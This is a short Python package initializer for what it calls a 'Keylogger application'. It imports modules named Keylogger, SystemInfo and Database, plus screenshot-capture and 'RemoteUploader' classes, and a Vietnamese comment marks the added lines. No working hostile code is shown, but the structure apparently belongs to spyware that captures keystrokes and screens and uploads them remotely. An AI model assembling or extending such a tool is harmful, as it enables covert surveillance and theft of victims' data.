#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Core package for the Keylogger application
"""

__author__ = "Developer"
__version__ = "1.0.0"

from .database import Database
from .keylogger import Keylogger
from .system_info import SystemInfo
from . import utils

__all__ = ['Database', 'Keylogger', 'SystemInfo', 'utils']

# Thêm vào file core/__init__.py
from .screenshot import ScreenshotCapturer, ScreenshotMonitor, RemoteUploader, get_display_info